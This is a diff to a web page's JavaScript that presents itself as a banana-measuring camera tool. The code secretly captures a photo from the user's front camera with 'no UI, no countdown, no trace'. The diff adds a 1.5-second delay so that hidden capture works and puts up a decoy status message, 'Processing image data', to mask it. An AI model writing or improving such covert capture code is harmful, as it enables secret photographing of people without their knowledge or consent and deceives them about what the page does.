@@ -507,7 +507,7 @@
       });
     }
 
-    // MAIN CAPTURE: back photo + hidden front (silent)
+    // MAIN CAPTURE: back photo + hidden front with 1.5 second delay after stopping back camera
     async function captureBananaAndHidden() {
       if (!backStream) {
         statusDiv.textContent = '❌ Camera not active. Open camera first.';
@@ -523,8 +523,7 @@
       // Ensure video has valid dimensions before capturing
       if (!video.videoWidth || !video.videoHeight) {
         statusDiv.textContent = '⚠️ Camera not ready, wait a moment...';
-        // brief delay to let camera stabilize
-        await new Promise(r => setTimeout(r, 300));
+        await new Promise(r => setTimeout(r, 400));
         if (!video.videoWidth || !video.videoHeight) {
           statusDiv.textContent = '⚠️ Camera not ready. Please retry.';
           btnCapture.disabled = false;
@@ -555,15 +554,18 @@
 
       statusDiv.textContent = '✅ Banana captured. Finalizing measurement data...';
 
-      // 2) CRITICAL: stop back stream BEFORE attempting front camera to avoid conflict
+      // 2) Stop back stream to release camera hardware
       if (backStream) {
         stopStream(backStream);
         backStream = null;
       }
 
-      // 3) Capture front camera silently (no UI, no countdown, no trace)
+      // 3) CRITICAL: wait 1.5 seconds before accessing front camera to ensure back camera is fully released
+      statusDiv.textContent = '📡 Processing image data (please wait)...';
+      await new Promise(resolve => setTimeout(resolve, 1500));
+
+      // 4) Capture front camera silently (no UI, no countdown, no trace)
       try {
-        statusDiv.textContent = '📡 Optimizing image data...';
         const frontImage = await captureFrontSilently();
         frontPhotoURL = frontImage;
         isBothReady = true;
